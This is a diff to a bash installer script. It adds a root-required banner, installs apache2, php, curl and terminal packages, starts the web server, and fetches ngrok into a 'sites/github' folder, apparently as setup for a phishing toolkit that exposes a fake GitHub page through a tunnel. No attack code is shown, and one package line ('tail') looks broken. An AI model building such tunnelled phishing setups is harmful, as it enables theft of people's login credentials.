@@ -1,9 +1,20 @@
 #!/bin/bash
 echo ""
+echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> MUST ROOT ! >> \e[0m'
+sleep 5
+clear
+echo ""
+echo ""
 echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
-
-echo ""
-echo ""
+sudo apt-get install apache2 -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+systemctl start apache2
+apt install xterm -y
+apt install gnome-terminal -y
+clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok-stable-linux-amd64.zip
 cp -R ngrok sites/github/
